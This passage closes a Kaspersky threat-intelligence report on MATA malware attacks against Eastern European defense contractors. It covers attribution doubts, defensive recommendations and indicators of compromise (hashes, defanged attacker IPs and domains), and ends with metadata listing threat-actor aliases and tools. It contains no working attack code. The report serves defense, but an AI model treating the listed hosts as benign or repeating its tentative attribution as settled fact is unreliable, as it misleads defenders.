Korean work environment.\n\nFig. 11 FontTable information of malicious document\n\n### Threat actor's timezone\n\nTo figure out the time zone of the threat actor behind this campaign, we summarized two\ntimelines; malware compilation time and backdoor commands delivered time. Both show malware\nauthors’ and malware operators’ active time. Among 84 malware samples, almost half of them were\ncreated in 00:00-02:00 GMT and rarely compiled between 14:00-23:00 GMT; likely the malware\nauthor wasn't active at this time. The keyboard hands-on activity is only observed between 03:0012:00 GMT, and we can't find any delivered commands between 13:00-23:00 GMT.\n\nBased on this active time, we can assume that around 00:00-13:00 GMT is the usual working time\nfor the threat actor, and 14:00-23:00 GMT is off-time. When we consider common working time,\n09:00-18:00 or 10:00-19:00, we roughly estimate the threat actor timezone is between GMT+7 and\nGMT+9.\n\n52\n\n\n-----\n\nFig. 12 Actor's activity timeline, in GMT\n\n### Attribution hesitation\n\nFrom the very first versions of MATA we have had some doubt as to how to attribute it. This\ndoubt grew with the latest MATA generations. On one side, there are obvious arguments that tie\nthe MATA family to the Lazarus group. At the same time, we see in the latest MATA generations\nmore techniques similar to ones used by Five Eyes APT groups. For example, such high-level\ntechniques as using tag-type-length-value serialization (TTLV) of configuration values, multilayered protocols, and a finite-state machine driven handshake have been seen in Purple Lambert.\nBring Your Own Vulnerable Driver has been seen in Magenta Lambert, and EDR bypass tools in\nGreen Lambert attacks. Combined active/passive backdoor modes were seen in\nEQUATIONVECTOR (also known as PeddleCheap) and SBZ (STRAITBIZZARE), and GoldLambert.\nWork on air-gapped networks is known to be used by the Iridium and Fanny implants by the\nEquation group. Dll-hollowing trick has been seen in the latest attack of reborn from the ashes\nDSZ-with-PC (DANDERSPRITZ + PEDDLECHEAP).\n\nTaking into account that the infosec industry has seen very low activity from Lamberts and\n[Equation groups during the last few years, and remembering the UMBRAGE collection has been](https://en.wikipedia.org/wiki/Vault_7#UMBRAGE)\n[mentioned in Vault7 leak in 2017, it may have been used for false flag operations in recent years.](https://en.wikipedia.org/wiki/Vault_7#UMBRAGE)\n\nThis must be a rich enough actor to allow itself to burn out three giant expensive frameworks in\none attack.\n\n53\n\n\n-----\n\n## Conclusions\n\nOur research uncovered a new, active campaign of the MATA cluster malware compromising\ndefense contractors in Eastern Europe. The campaign spanned over six months and remained\nactive until May 2023 and featured three new generations of the MATA. One of them is an\nevolution of previous MATA generation 2. Second, the malware we dubbed \"MataDoor\", has been\nrewritten from scratch and may be considered as generation 4, and then generation 5 has been\nrewritten from scratch as well.\n\nAll of them introduce several modifications to its encryption, configuration, and communication\nprotocols. The actor demonstrated high capabilities of navigating through and leveraging security\nsolutions deployed in the victim's environment. In situations where no communication line to a\ndesired target host was possible, the actor used a USB propagation module capable of bridging\nthe air-gapped networks.\n\nAttackers used many techniques to hide their activity: rootkits and vulnerable drivers, disguising\nfiles as legitimate applications, using ports open for communication between applications, multilevel encryption of files and network activity of malware, setting long wait times between\nconnections to control servers - this and much more shows how sophisticated modern targeted\nattacks can be.\n\nTo successfully detect and respond to such attacks, it is necessary to take an integrated\napproach to ensuring enterprise information security, including the use of specialized solutions for\nidentifying complex threats and targeted attacks, e.g. XDR security solutions.\n\n## Recommendations\n\nWe recommend taking the following measures to avoid falling victim to the attack described\nabove:\n\n1. Enable two-factor authentication for logging in to administration consoles and web\ninterfaces of security solutions. In the Kaspersky Security Center, for example, this can\n[be done by following these instructions: https://support.kaspersky.com/KSC/14/en-](https://support.kaspersky.com/KSC/14/en-US/211403.htm)\n[US/211403.htm](https://support.kaspersky.com/KSC/14/en-US/211403.htm)\n\n2. If any Indicators of Compromise have been identified, change all domain account\npasswords, both for users and for computers. To prevent threat actors from\nconducting Golden Ticket attacks, the password to the krbtgt service domain account\nshould be changed twice, with a very short time interval between the password changes.\n\n3. Install up-to-date versions of centrally managed security solutions on all systems (both\nservers and workstations running Windows or Linux) and update antivirus databases and\nprogram modules on a regular basis.\n\n54\n\n\n-----\n\n4. Check that all security solutions components are enabled on all systems and that active\npolicies prohibit disabling protection and terminating or removing solutions components\nwithout entering the administrator password.\n\n5. Check that security solutions receive up-to-date threat information from the\nKaspersky Security Network on those groups of systems on which using cloud services\nis not forbidden by laws or regulations.\n\n6. Check that license keys of security solutions have been distributed to all devices and\nthat periodical system scanning tasks have been created for all device groups.\n\n7. Update Microsoft Windows, as well as Unix-like operating systems, to versions currently\nsupported by the vendors. Install the latest security updates (patches) for operating\nsystems and applications.\n\n8. Update Microsoft Office and Microsoft Internet Explorer to versions currently\nsupported by the vendor. Install the latest security updates (patches) for these\nsoftware products.\n\n9. Check that Active Directory policies include restrictions on user attempts to log in to\nthe system. Users should be allowed to log in only to those systems for which access is\nrequired for them to perform their job responsibilities.\n\n10. Train employees of the enterprise to work securely with the internet, email, and other\ncommunication channels. Specifically, explain the possible consequences of\ndownloading and launching files from unverified sources. Place emphasis on phishing\nemail control, as well as secure practices related to working with Microsoft Office\ndocuments.\n\n11. Configure filtration of content sent via email and set up multi tier filtration of incoming\nemail traffic.\n\n12. Establish the following password complexity requirements in Active Directory group\npolicies:\n\na. Password length: at least 10 characters for unprivileged accounts and 16 characters\nfor privileged accounts.\n\nb. A password should contain uppercase letters, lowercase letters, digits, and special\ncharacters:\n(! @ # $ % ^ & * ( ) - _ + = ~ [ ] { } | \\ : ; ' \" < >, . ? /)\n\nc. A password should not contain dictionary words or the user’s personal data that\ncould be used to crack the password, such as:\nthe user’s name(s), telephone numbers, memorable dates (birthdays, etc.);\ncharacters located sequentially on the keyboard (“12345678”, “QWERTY”, etc.);\ncommon abbreviations and terms (“USER”, “TEST”, “ADMIN”, etc.).\n\n13. Make it the responsibility of administrators to avoid using privileged accounts except in\ncases where their duties can only be performed using these accounts. It is also\n\n55\n\n\n-----\n\nrecommended that different dedicated accounts be used for administration of\ndifferent groups of systems, e.g., databases.\n\n14. Disable caching credentials in memory by launching a .reg file with the following\ncontents on all systems in the domain:\n\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\\nWDigest]\n\"UseLogonCredential\"=dword:00000000\n\n15. Prohibit storing and sending passwords in plain text; use dedicated password\nmanagement software to store and transfer passwords.\n\n16. Implement two-factor authentication for authorization (using RDP or other protocols)\non systems that contain confidential data and systems that are critical for the\norganization’s IT infrastructure, such as domain controllers.\n\n17. Enhance network segmentation. Configure the networks of different divisions (as well\nas different enterprises) as separate segments. Limit data transfers between network\nsegments to a minimally required list of ports and protocols that are necessary to\noperate the organization’s work processes.\n\n18. Segregate services related to maintaining the organization’s information security into a\ndedicated segment and, if possible, into a separate domain. Limit data transfers between\nthat segment and the rest of the network to a minimally required list of ports and protocols\nthat are necessary for the operation of security solutions and for conducting monitoring to\nidentify information security incidents.\n\n19. If remote access to systems in other network segments is needed, setup demilitarized\nzones (DMZ) for communication between network segments and carry out remote\naccess via terminal servers.\n\n20. Configure the backup storage system to store backup copies on a separate server that\nis not part of the domain and ensure that backup deletion and modification rights are\nheld only by a dedicated account, which is not part of the domain, either. This measure\ncan help protect backup copies in case the domain becomes compromised.\n\n21. Increase the frequency with which backup copies are created to ensure that the failure\nof any server does not result in the loss of a critical volume of information.\n\n22. Store at least three backup copies for each server and for other systems that are\nimportant for the organization’s normal operation. In addition, at least one backup copy\nshould be stored on a separate, autonomous data storage device.\n\n23. Use RAID arrays on servers on which backup copies are stored. This will help improve the\nbackup system’s fault tolerance.\n\n24. Implement a procedure for regular checks of backup integrity and usability. In addition,\nimplement a procedure for regularly scanning backup copies with an antimalware\nsolution.\n\n56\n\n\n-----\n\n25. Conduct an off-schedule scan of all removable data media used in the organization with\nan antimalware solution and using the Indicators of Compromise provided.\n\n26. We also recommend, irrespective of whether signs of an information security incident\nare present or not, that Kaspersky Security Center settings be brought in line with the\nbest practices described in the Hardening Guide:\n[https://support.kaspersky.com/KSC/14.2/en-US/245736.htm](https://support.kaspersky.com/KSC/14.2/en-US/245736.htm)\n\n## Indicators of Compromise\n```\nFiles hash (MD5)\na1fc74b7fb105252aba222f5099fbd04 - Malicious document\nbb93392daece237207b6e32fb5fb4f00 - Malicious document\n0818cda2299b358e1ddf4ea59249a6c4 - Malicious document\n14fee51bb001abb6ea2c0d8c78863a0d - Malicious PowerShell script\na6a6d7b87656a0590a12c3ebaa678740 - Malicious PowerShell script\n8f0d45e48d797ac3631b5b572d44b6e8 - Exploit (CVE-2021-26411)\na88f606a45cea11909fcedadc8945ba7 - Exploit (CVE-2021-26411)\nb29d5a6445140ca3bbdef4f05ea17fd5 - Validator\nb458e336911f092177a64d07b0bf1c76 - Validator\nfed5ff0f9460fea41a8278fffa4c2ddb - Validator\ne6cc5ba724854702abc7f530d1a8f19c - Loader\n6b987944074fda626f8b00751fb9d197 - Loader\na966668feca72d8dddf3c737d4908a29 - Loader\nb52439640b7f0e0273f0d15bb3af6198 - Loader\nfd7de2b8572f35f0f6f58bba6ff2360e - Loader\n4d1e16e2b914243e0c63017676956a73 - Loader\n0ba8fe6dd895184236618a042bdf835b - LLoader\n13e9b02b089e9a01ddbe41452d2c409d - LLoader\n9347abda2aaaefb40aa1e4034a6ded58 - Installer\nea138d32ce4371d0921cb9f0daead4cb - Downloader\n01b3c7b2ff7e5158f80f593c09232e04 - MATA-3\n996013c565b1f0ae68418d09d712d72b – MataDoor (MATA-4)\n5f619927b586a6f776eb582f661ed55c - MataDoor (MATA-4)\n91014e9b43ad489535e62e1b048feb59 - MATA (signed)\n289b0d0b626b0be26ee81ed84fb94ec1 - MATA Lotus\n9672437e1dc219ca8a4ee847bed25d0d - Linux MATA-3\n63e7b2fc0a0e6f1db3dee98f4f1dec43 - USB module\n5c3a88073824a1bce4359a7b69ed0a8d - Uploader\n2f9e82625774c8051607f791fb9de9b1 - RemoteShell\n0ef0dfbb4a56cf1d6eff6032ea988162 - Stealer\n09f6c007b16804841a6d02ae87107e3f - Stealer\nfee8d182e6643099523dab41ba1c95b5 - Stealer\n91d04fd26dda91a90fa4169cb251d8ab - UAC Bypass tool\n80008a0f7035893d17d7f659e81e716e - UAC Bypass tool\n\n```\n57\n\n\n-----\n\n```\n6533e7d5f0f680006031512f8378bfcb - EDR bypass tool\nfee3bc01a67339e8eceb9514d8be629c - EDR bypass tool\n3452a24904da2fcf6b79ee1734e9eee1 – Rootkit\n15b33a171003fa1a0a24c6ca8f24115a - Command file tool\n2BF250D64E72A14F05EE190148291564 - MATA-5\n108854ed57caeeeaeefc20182ea67e94 - Lateral movement tool\n94980f93bd9019d84b42104615e86b79 - Lateral movement tool\nIP address\n185.62.56[.]117\n37.120.222[.]191\n185.25.50[.]199\n85.239.33[.]250\nDomain name\ntarzoose[.]com\nbeeztrend[.]com\ncakeduer[.]com\nzawajonly[.]com\nmerudlement[.]com\nicimp.swarkul[.]com\nmbafleet[.]com\nprajeshpatel[.]com\nmyballmecg[.]com\nspeclaurp[.]com\n\n```\nKaspersky Global Research & Analysis Team (Kaspersky GReAT)\n\nEstablished in 2008, GReAT operates at the very heart of Kaspersky, uncovering APTs, cyberespionage campaigns, major malware, ransomware, and underground cyber-criminal trends across\nthe world. Today GReAT consists of 40+ experts working globally – in Europe, Russia, Americas,\nAsia, Middle East. Talented security professionals provide company leadership in anti-malware\nresearch and innovation, bringing unrivaled expertise, passion and curiosity to the discovery and\nanalysis of cyberthreats.\n\nKaspersky GReAT [intelreports@kaspersky.com](mailto:intelreports@kaspersky.com)\n\nKaspersky Industrial Control Systems Cyber Emergency Response Team (Kaspersky ICS CERT)\nis a global project of Kaspersky aimed at coordinating the efforts of automation system vendors,\nindustrial facility owners and operators, and IT security researchers to protect industrial enterprises\nfrom cyberattacks. Kaspersky ICS CERT devotes its efforts primarily to identifying potential and\nexisting threats that target industrial automation systems and the industrial internet of things.\n\n[Kaspersky ICS CERT](https://ics-cert.kaspersky.com/) [ics-cert@kaspersky.com](mailto:ics-cert@kaspersky.com)\n\n58\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/10/18092216/Updated-MATA-attacks-Eastern-Europe_full-report_ENG.pdf"
    ],
    "report_names": [
        "Updated-MATA-attacks-Eastern-Europe_full-report_ENG.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "75455540-2f6e-467c-9225-8fe670e50c47",
            "created_at": "2022-10-25T16:07:23.740266Z",
            "updated_at": "2025-03-27T02:02:09.955585Z",
            "deleted_at": null,
            "main_name": "Iridium",
            "aliases": [],
            "source_name": "ETDA:Iridium",
            "tools": [
                "CHINACHOPPER",
                "China Chopper",
                "LazyCat",
                "Powerkatz",
                "SinoChopper",
                "reGeorg"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "0661a292-80f3-420b-9951-a50e03c831c0",
            "created_at": "2023-01-06T13:46:38.928796Z",
            "updated_at": "2025-03-27T02:00:02.953963Z",
            "deleted_at": null,
            "main_name": "IRIDIUM",
            "aliases": [],
            "source_name": "MISPGALAXY:IRIDIUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "23dfc9f5-1862-4510-a6ae-53d8e51f17b1",
            "created_at": "2024-05-01T02:03:08.146025Z",
            "updated_at": "2025-03-27T02:05:17.420497Z",
            "deleted_at": null,
            "main_name": "PLATINUM TERMINAL",
            "aliases": [
                "Longhorn ",
                "The Lamberts ",
                "Vault7 ",
                "APT-C-39 "
            ],
            "source_name": "Secureworks:PLATINUM TERMINAL",
            "tools": [
                " Assassin",
                " Marble Framework",
                "AfterMidnight"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1f6ae238-765f-4495-9d54-6a7883d7a319",
            "created_at": "2022-10-25T16:07:24.573456Z",
            "updated_at": "2025-03-27T02:02:10.284644Z",
            "deleted_at": null,
            "main_name": "TA511",
            "aliases": [
                "MAN1",
                "Moskalvzapoe"
            ],
            "source_name": "ETDA:TA511",
            "tools": [
                "Agentemis",
                "Chanitor",
                "Cobalt Strike",
                "CobaltStrike",
                "Ficker Stealer",
                "Hancitor",
                "NetSupport",
                "NetSupport Manager",
                "NetSupport Manager RAT",
                "NetSupport RAT",
                "NetSupportManager RAT",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "08623296-52be-4977-8622-50efda44e9cc",
            "created_at": "2023-01-06T13:46:38.549387Z",
            "updated_at": "2025-03-27T02:00:02.859535Z",
            "deleted_at": null,
            "main_name": "Equation Group",
            "aliases": [
                "Tilded Team",
                "EQGRP",
                "G0020"
            ],
            "source_name": "MISPGALAXY:Equation Group",
            "tools": [
                "EquationLaser",
                "EquationDrug",
                "DoubleFantasy",
                "TripleFantasy",
                "GrayFish"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2d9fbbd7-e4c3-40e5-b751-27af27c8610b",
            "created_at": "2024-05-01T02:03:08.144214Z",
            "updated_at": "2025-03-27T02:05:17.419705Z",
            "deleted_at": null,
            "main_name": "PLATINUM COLONY",
            "aliases": [
                "Equation Group "
            ],
            "source_name": "Secureworks:PLATINUM COLONY",
            "tools": [
                " EquationDrug",
                " EquationLaser",
                " Fanny",
                " GrayFish",
                " TripleFantasy",
                "DoubleFantasy"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "542cf9d0-9c68-428c-aff8-81b6f59dc985",
            "created_at": "2023-02-15T02:01:49.554105Z",
            "updated_at": "2025-03-27T02:00:03.110991Z",
            "deleted_at": null,
            "main_name": "Moskalvzapoe",
            "aliases": [
                "MAN1",
                "TA511"
            ],
            "source_name": "MISPGALAXY:Moskalvzapoe",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e0fed6e6-a593-4041-80ef-694261825937",
            "created_at": "2022-10-25T16:07:23.593572Z",
            "updated_at": "2025-03-27T02:02:09.879892Z",
            "deleted_at": null,
            "main_name": "Equation Group",
            "aliases": [
                "APT-C-40",
                "Platinum Colony",
                "Tilded Team"
            ],
            "source_name": "ETDA:Equation Group",
            "tools": [
                "Bvp47",
                "DEMENTIAWHEEL",
                "DOUBLEFANTASY",
                "DanderSpritz",
                "DarkPulsar",
                "DoubleFantasy",
                "DoubleFeature",
                "DoublePulsar",
                "Duqu",
                "EQUATIONDRUG",
                "EQUATIONLASER",
                "EQUESTRE",
                "Flamer",
                "GRAYFISH",
                "GROK",
                "OddJob",
                "Plexor",
                "Prax",
                "Regin",
                "Skywiper",
                "TRIPLEFANTASY",
                "Tilded",
                "UNITEDRAKE",
                "WarriorPride",
                "sKyWIper"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7bd810cb-d674-4763-86eb-2cc182d24ea0",
            "created_at": "2022-10-25T16:07:24.1537Z",
            "updated_at": "2025-03-27T02:02:10.126127Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "APT 44",
                "ATK 14",
                "BE2",
                "Blue Echidna",
                "CTG-7263",
                "FROZENBARENTS",
                "IRIDIUM",
                "Iron Viking",
                "Quedagh",
                "Sandworm",
                "Sandworm Team",
                "Seashell Blizzard",
                "TEMP.Noble",
                "UAC-0082",
                "UAC-0113",
                "UAC-0125",
                "UAC-0133",
                "Voodoo Bear"
            ],
            "source_name": "ETDA:Sandworm Team",
            "tools": [
                "AWFULSHRED",
                "ArguePatch",
                "BIASBOAT",
                "Black Energy",
                "BlackEnergy",
                "CaddyWiper",
                "Colibri Loader",
                "Cyclops Blink",
                "CyclopsBlink",
                "DCRat",
                "DarkCrystal RAT",
                "Fobushell",
                "GOSSIPFLOW",
                "Gcat",
                "IcyWell",
                "Industroyer2",
                "JaguarBlade",
                "JuicyPotato",
                "Kapeka",
                "KillDisk.NCX",
                "LOADGRIP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "ORCSHRED",
                "P.A.S.",
                "PassKillDisk",
                "Pitvotnacci",
                "PsList",
                "QUEUESEED",
                "RansomBoggs",
                "RottenPotato",
                "SOLOSHRED",
                "SwiftSlicer",
                "VPNFilter",
                "Warzone",
                "Warzone RAT",
                "Weevly"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
